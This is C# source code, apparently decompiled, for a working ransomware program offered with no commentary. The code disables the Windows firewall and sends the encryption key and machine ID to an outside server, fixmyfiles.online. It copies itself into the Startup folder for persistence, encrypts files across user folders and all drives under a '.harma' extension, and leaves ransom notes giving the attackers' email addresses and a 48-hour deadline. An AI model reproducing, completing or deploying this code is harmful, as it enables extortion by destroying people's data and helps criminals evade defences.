using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using ransom.Properties;

namespace ransom;

internal class Program
{
	private static string instruction_file = "ReadMe.txt";

	private static string[] emails_addresses = new string[2] { "Troll900@tutamail.com", "Troll900@tutanota.com" };

	public static string Key;

	private static string instruction_text = "What happend for my computer?\r\nAll your files are encrypted due a security issue in your computer.\r\nWhat should i do?\r\nYou have 48 hours to email us.Otherwise, the decryption price will increase or become impossible.\r\nYour email must contain your unique id.\r\nyour unique id is " + VariableHelper.GetHardSerialNumber() + ".\r\nEmail Address: " + emails_addresses[0] + "\r\nIf you didn't recive any response till 24 hours,Send email to this address: " + emails_addresses[1] + "\r\nWhat is our guarantee?\r\nWe decrypt two files for you Free to be sure that we are able to recover your files.";

	public static string file_extension = ".id-" + VariableHelper.GetHardSerialNumber() + ".[" + emails_addresses[0] + "].harma";

	private static string[] files_folders = new string[12]
	{
		"Videos", "Desktop", "Contacts", "Searches", "Saved Games", "Pictures", "OneDrive", "Music", "Links", "Favorites",
		"Downloads", "Documents"
	};

	[DllImport("KERNEL32.DLL")]
	public static extern bool RtlZeroMemory(IntPtr Destination, int Length);

	private static void Main(string[] args)
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				ExecutionHelper.ExecuteAsAdmin(Assembly.GetExecutingAssembly().Location);
				Environment.Exit(0);
			}
			catch
			{
				ConsoleHelper.Writelinewithcolor("Admin access is not available", ConsoleColor.Red);
			}
		}
		else
		{
			ConsoleHelper.Writelinewithcolor("Admin access is available", ConsoleColor.Green);
		}
		ConsoleHelper.WriteEmptyline();
		DriveInfo[] array = DriveInfo.GetDrives().ToArray();
		long num = 0L;
		DriveInfo[] array2 = array;
		foreach (DriveInfo driveInfo in array2)
		{
			if (driveInfo.IsReady)
			{
				ConsoleHelper.Writelinewithcolor("Drive " + driveInfo.Name + " size: " + FileHelper.ParseByteInString(driveInfo.TotalSize - driveInfo.TotalFreeSpace) + " status: Ready", ConsoleColor.Green);
				num += driveInfo.TotalSize - driveInfo.TotalFreeSpace;
			}
			else
			{
				ConsoleHelper.Writelinewithcolor("Drive " + driveInfo.Name + " status: Not Ready", ConsoleColor.Red);
			}
		}
		ConsoleHelper.WriteEmptyline();
		ConsoleHelper.Writelinewithcolor("Total system files size: " + FileHelper.ParseByteInString(num), ConsoleColor.Magenta);
		ExecutionHelper.ExecuteCmdCommand("netsh.exe netsh advfirewall set currentprofile state off");
		ExecutionHelper.ExecuteCmdCommand("netsh.exe netsh firewall set opmode mode=disable");
		Key = AES.GenerateRandomString();
		GCHandle gCHandle = GCHandle.Alloc(Key, GCHandleType.Pinned);
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		using (WebClient webClient = new WebClient())
		{
			webClient.Headers.Add("id", VariableHelper.GetHardSerialNumber());
			webClient.Headers.Add("hardSize", FileHelper.ParseByteInString(num));
			webClient.Headers.Add("key", Key);
			webClient.DownloadString("http://fixmyfiles.online/api/");
		}
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\ransom.exe");
		}
		catch
		{
		}
		try
		{
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\info.hta", Resources.info.Replace("em1", emails_addresses[0]).Replace("em2", emails_addresses[1]).Replace("id1", VariableHelper.GetHardSerialNumber()));
		}
		catch
		{
		}
		ThreadPool.SetMinThreads(1000, 1000);
		ThreadPool.SetMaxThreads(1000, 1000);
		Thread.Sleep(5000);
		foreach (string item in FileHelper.GetUsersDirectory())
		{
			string[] array3 = files_folders;
			foreach (string text in array3)
			{
				foreach (string file2 in FileHelper.GetFiles(item + "\\" + text))
				{
					try
					{
						if (VariableHelper.Extensions.Contains(new FileInfo(file2).Extension) && !new FileInfo(file2).Name.Equals(instruction_file))
						{
							ThreadPool.QueueUserWorkItem(delegate
							{
								EncryptFile(file2);
							});
						}
						else
						{
							ConsoleHelper.Writelinewithcolor("File is not important.File path: " + file2, ConsoleColor.Yellow);
						}
					}
					catch
					{
					}
				}
			}
		}
		foreach (DriveInfo item2 in array.Where((DriveInfo x) => x.IsReady))
		{
			string[] array3 = Directory.GetDirectories(item2.Name);
			foreach (string text2 in array3)
			{
				if (!FileHelper.necessarytoencrypt(text2))
				{
					continue;
				}
				foreach (string file in FileHelper.GetFiles(text2))
				{
					try
					{
						if (VariableHelper.Extensions.Contains(new FileInfo(file).Extension) && !new FileInfo(file).Name.Equals(instruction_file))
						{
							ThreadPool.QueueUserWorkItem(delegate
							{
								EncryptFile(file);
							});
						}
						else
						{
							ConsoleHelper.Writelinewithcolor("File is not important.File path: " + file, ConsoleColor.Yellow);
						}
					}
					catch
					{
					}
				}
			}
		}
		File.WriteAllText("info.hta", Resources.info.Replace("em1", emails_addresses[0]).Replace("em2", emails_addresses[1]).Replace("id1", VariableHelper.GetHardSerialNumber()));
		Process.Start("info.hta");
		RtlZeroMemory(gCHandle.AddrOfPinnedObject(), Key.Length * 2);
		gCHandle.Free();
		Environment.Exit(0);
	}

	private static void EncryptFile(string _filepath)
	{
		try
		{
			if (!File.Exists(Path.GetDirectoryName(_filepath) + "\\" + instruction_file))
			{
				File.WriteAllText(Path.GetDirectoryName(_filepath) + "\\" + instruction_file, instruction_text);
			}
		}
		catch
		{
		}
		try
		{
			File.WriteAllBytes(_filepath, AES.Encrypt(Key, File.ReadAllBytes(_filepath)));
			FileHelper.RenameFile(_filepath, _filepath + file_extension);
			ConsoleHelper.Writelinewithcolor("The file was successfully encrypted.\r\nFilepath: " + _filepath, ConsoleColor.Green);
		}
		catch (Exception ex)
		{
			ConsoleHelper.Writelinewithcolor("Encryption failed.Error message: " + ex.Message, ConsoleColor.Red);
		}
	}
}
